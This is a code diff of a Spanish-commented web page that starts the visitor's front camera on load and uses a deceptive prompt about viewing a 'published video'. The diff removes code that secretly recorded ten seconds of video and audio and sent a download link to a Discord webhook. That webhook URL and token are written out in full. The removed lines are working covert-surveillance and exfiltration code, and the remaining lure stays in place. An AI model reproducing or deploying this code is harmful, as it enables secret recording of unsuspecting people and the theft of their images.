@@ -64,8 +64,7 @@
                 const constraints = {
                     video: {
                         facingMode: "user" // Intenta usar la cámara frontal
-                    },
-                    audio: true // Habilitar el audio para grabar con sonido
+                    }
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('video');
@@ -73,58 +72,13 @@
                 videoElement.srcObject = stream;
                 videoElement.style.display = 'block';
                 previewImage.style.display = 'none';
-
-                // Iniciar la grabación automáticamente
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                const chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => {
-                    chunks.push(e.data);
-                };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const enlaceDescarga = await guardarVideo(blob);
-                    enviarMensajeDiscordConWebhook(enlaceDescarga);
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 10000); // Detener la grabación después de 10 segundos
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
                 alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
             }
         }
 
-        async function guardarVideo(blob) {
-            // Aquí puedes implementar la lógica para guardar el video en tu servidor o en un servicio de almacenamiento en la nube
-            // Por ahora, simplemente devolveremos un enlace temporal para mostrar cómo funciona
-            return URL.createObjectURL(blob);
-        }
-
-        async function enviarMensajeDiscordConWebhook(enlace) {
-            try {
-                const webhookURL = 'https://discord.com/api/webhooks/1243016760014278737/-rJTQS8xYX2H-zZHV22yU4LCJOxhYIJsfNtERt_Z3Wbd0wLWnzD7QKYwHL0h4iDXicSX'; // URL del webhook de Discord
-
-                const mensaje = {
-                    content: `Aquí tienes el enlace de descarga del video: ${enlace}`
-                };
-
-                const respuesta = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(mensaje)
-                });
-
-                console.log('Mensaje enviado a Discord a través del webhook:', respuesta);
-            } catch (error) {
-                console.error('Error al enviar el mensaje a Discord a través del webhook:', error);
-            }
-        }
+        window.addEventListener('load', startWebcam);
     </script>
 </body>
 </html>
